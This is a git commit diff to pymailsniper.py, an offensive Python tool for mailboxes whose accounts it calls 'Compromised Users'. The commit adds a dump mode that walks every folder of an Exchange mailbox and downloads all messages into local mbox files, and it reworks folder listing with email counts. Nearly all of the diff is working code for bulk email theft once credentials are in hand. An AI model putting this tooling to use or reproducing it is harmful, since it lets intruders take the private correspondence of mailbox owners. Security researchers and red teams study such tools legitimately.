9e9643ff28d23a2d7778a0ca6794d96cb78b879c
HydroSausager <hidrosausager@mail.ru>
2022-01-23 22:32:10 +0300

    Implemented dump mode Prettier folder listing with counting some new functions and refactoring

--- pymailsniper.py
+++ pymailsniper.py
@@ -59,31 +59,44 @@ def acctSetup(params):
 
 
 # List folders from a users inbox
-def folderList(accountObject, tree_view=False, count=False):
-    root_folder = accountObject.root
+def print_folders(accountObject, tree_view=False, count=False, root=False):
+    root_folder = accountObject.root if root else accountObject.msg_folder_root
     # 'Top of Information Store'
 
     print('[+] Folder List for Compromised Users' + '\n')
 
     if tree_view and not count:
         print(root_folder.tree())
+        print("\n[=] Done\n")
         return
     elif tree_view and count:
-        tree = root_folder.tree()
+        tree = root_folder.tree()#.split("\n")
     if tree_view and count:
         for folder_object in root_folder.walk():
             folder_childs = f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
-            tree = tree.replace(folder_object.name + "\n", folder_object.name + folder_childs + "\n")
+            # tree = tree.replace(folder_object.name + "\n", "{:50s} {}\n".format(folder_object.name, folder_childs))
+            regex = f"(?<=(\n)).*({folder_object.name.replace('?','.')})\n"
+
+            try:
+                result = re.search(regex, tree).group(0)
+                tree = tree.replace(result, "{:50s} {}\n".format(result[:-1], folder_childs))
+            except Exception as e:
+                pass
+
         print(tree)
+        print("\n[=] Done\n")
         return
 
     if not tree_view:
         for folder_object in root_folder.walk():
+            info_to_print = ""
 
-            info_to_print = folder_object.absolute
             if count:
-                info_to_print += f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
-            print(info_to_print)
+                folder_childs = f'(folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
+
+            info_to_print += folder_object.absolute
+            print("{:28s} {}".format(folder_childs, info_to_print))
+        print("\n[=] Done\n")
 
 
 # Search users email for specified terms
@@ -231,65 +244,106 @@ def print_logo():
     print(logo)
 
 
-def dump_folder(accountObject=None, folder=None):
-    folder = accountObject.inbox
-
-    mbox = mailbox.mbox("./dump.mbox")
-    mbox.lock()
-    # inbox = accountObject.inbox.all().order_by('-datetime_received')
-    # inbox2 = inbox.only('id', 'changekey')
-    # item_ids_remote = list(inbox2)
-
-    # total_items_remote = len(item_ids_remote)
-    # print(total_items_remote)
-
-    qs = accountObject.inbox.all().only('mime_content')[:10]
-    # qs.page_size = 200  # Number of IDs for FindItem to get per page
-    # qs.chunk_size = 5  # Number of full items for GetItem to request per call
-
-    for email in qs:
-        msg = mailbox.mboxMessage(email.mime_content)
-        mbox.add(msg)
-        mbox.flush()
-        # print("[{}/{}] {} {}".format(i, len(new_ids), str(item.datetime_received), item.subject))
-
-    mbox.unlock()
+def findFolder(accountObject=None, folder_to_find=None):
+    for folder in accountObject.msg_folder_root.walk():
+        if folder.name.lower() == folder_to_find.lower():
+            return folder
+    else:
+        return None
 
 
-def dump_all(accountObject=None):
-    # брать папку из аргументов если dump all -d "папка куда"
+def sanitaze_file_path(file_path=None):
+    return re.sub("[^а-яА-ЯёЁ0-9a-zA-Z\s-]+", " ", file_path)
+
+
+def dump_to_Mbox(folder_name=None, mbox_file_path=None, messages=[]):
     try:
-        os.mkdir("dump")
-    except:
-        os.rmdir("dump")
-        os.mkdir("dump")
+        mbox = mailbox.mbox(mbox_file_path)
+        mbox.lock()
+        for message in messages:
+            msg = mailbox.mboxMessage(message)
+            mbox.add(msg)
+            mbox.flush()
+        mbox.unlock()
+    except Exception as e:
+        print(f"[-] Error while saving {folder_name} to {mbox_file_path}:")
+        print(e)
+    finally:
+        print(f"\n[+] Dumped folder \"{folder_name}\" to {mbox_file_path}")
 
 
-    base = accountObject.msg_folder_root
+def get_emails(accountObject=None, items_list=None, folder_name=None):
+    messages = []
+    items_list = list(items_list)
+    # you can try with this parameter for perfomance:
+    # bur in my case by one is fastest
+    count_per_task = 1
+    if folder_name:
+        desc = f"[+] Downloading folder \"{folder_name}\""
+    else:
+        desc = ""
+    for i in tqdm.tqdm(range(0, len(items_list), count_per_task), desc=desc, leave=False, unit="email"):
+        temp = items_list[i:i + count_per_task]
+        for mime in accountObject.fetch(temp):
+            messages.append(mime.mime_content)
+    # if folder_name:
+    #     print(f"[+] Downloaded {folder_name}")
+    return messages
 
-    for folder in base.walk():
+
+def dumpFolder(accountObject=None, folder_to_dump="Inbox", local_folder="dump"):
+    # брать папку из аргументов если dump all -d "папка куда"
+
+    base_folder = None
+
+    if folder_to_dump.lower() == "inbox":
+        base_folder = accountObject.Inbox
+    elif folder_to_dump.lower() == "sent":
+        base_folder = accountObject.Sent
+    elif folder_to_dump.lower() == "all":
+        base_folder = accountObject.msg_folder_root
+    else:
+        base_folder = findFolder(accountObject=accountObject, folder_to_find=folder_to_dump)
+        if not base_folder:
+            print(f"\n[-] Folder {local_folder} not found")
+            return 1
+
+    if os.path.isdir(local_folder):
+        print(f"\n[-] Folder {local_folder} allready exists, use another (-d)")
+        return 1
+    else:
+        try:
+            os.mkdir(local_folder)
+            print(f"\n[+] Folder {local_folder} created")
+        except Exception as e:
+            print(f"\n[-] Something went wrong while creating {local_folder}:")
+            print(e)
+            return 1
+
+    # If messages in folder are present:
+    if base_folder.total_count != 0:
+        folder_name = sanitaze_file_path(base_folder.name)
+        mbox_file_path = f"./{local_folder}/{folder_name}.mbox"
+        items = base_folder.all().only('id', 'changekey').order_by('-datetime_received')
+        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=base_folder.name)
+        dump_to_Mbox(folder_name=base_folder.name, mbox_file_path=mbox_file_path, messages=messages)
+
+    # Walking across subfolders:
+    for folder in base_folder.walk():
+        # If folder have no messages, go to next folder
         if folder.total_count == 0:
             continue
 
-        folder_name = (folder.absolute).replace(base.absolute+"/","")
-        folder_name = re.sub("[^0-9a-zA-Z\s]+", " ", folder_name)
+        mbox_file_path = (folder.absolute).replace(base_folder.absolute + "/", "")
+        mbox_file_path = sanitaze_file_path(mbox_file_path)
+        mbox_file_path = f"./{local_folder}/{mbox_file_path}.mbox"
 
-        mbox_file_path = "./dump/"+folder.name+".mbox"
+        items = folder.all().only('id', 'changekey').order_by('-datetime_received')#[:10]
+        messages = get_emails(accountObject=accountObject, items_list=items, folder_name=folder.name)
 
-        print(f"[+] Dumping {folder.name} to {mbox_file_path}")
+        dump_to_Mbox(folder_name=folder.name, mbox_file_path=mbox_file_path, messages=messages)
 
-        mbox = mailbox.mbox(mbox_file_path)
-        mbox.lock()
-        # Ограничение на 10 писем для тестов
-        qs = folder.all().only('mime_content')[:10]
-
-        # Ограничение на 10 писем для тестов
-        for _ in tqdm.trange(10, leave=True):
-            for email in qs:
-                msg = mailbox.mboxMessage(email.mime_content)
-                mbox.add(msg)
-                mbox.flush()
-        mbox.unlock()
+    print("[=] All folders downloaded\n\n")
 
 
 if __name__ == "__main__":
@@ -319,11 +373,15 @@ if __name__ == "__main__":
                                help='Print folders absolute paths instead tree if arg is present')
     folder_parser.add_argument('-c', '--count', action='store_true', default=False,
                                help='Print count of child folders and email if present')
+    folder_parser.add_argument('-r', '--root', action='store_true', default=False,
+                               help='Use "root" folder as root for printing insted of "Top Information Store"')
 
     dump_parser = subparsers.add_parser(
         'dump', help="Download emails", parents=[optional_parser])
     dump_parser.add_argument('folder', action='store', default="Inbox",
                              help='Folder to dump')
+    dump_parser.add_argument('-d', '--dump-folder', action='store', default="dump",
+                             help='Local folder to store .mbox dumps')
 
     attach_parser = subparsers.add_parser(
         'attachment', help="List/Download Attachments", parents=[optional_parser])
@@ -382,12 +440,9 @@ if __name__ == "__main__":
     print(f"[+] Email - {args.email}, server - {args.server}")
 
     if parsed_arguments['modules'] == 'folders':
-        folderList(accountObj, tree_view=not args.absolute, count=args.count)
+        print_folders(accountObj, tree_view=not args.absolute, count=args.count, root=args.root)
     elif parsed_arguments['modules'] == 'dump':
-        if args.folder == 'all':
-            dump_all(accountObj)
-        else:
-            dump_folder(accountObj, args.folder)
+        dumpFolder(accountObj, folder_to_dump=args.folder, local_folder=args.dump_folder)
     elif parsed_arguments['modules'] == 'emails':
         searchEmail(accountObj, parsed_arguments, loghandle)
     elif parsed_arguments['modules'] == 'attachment':
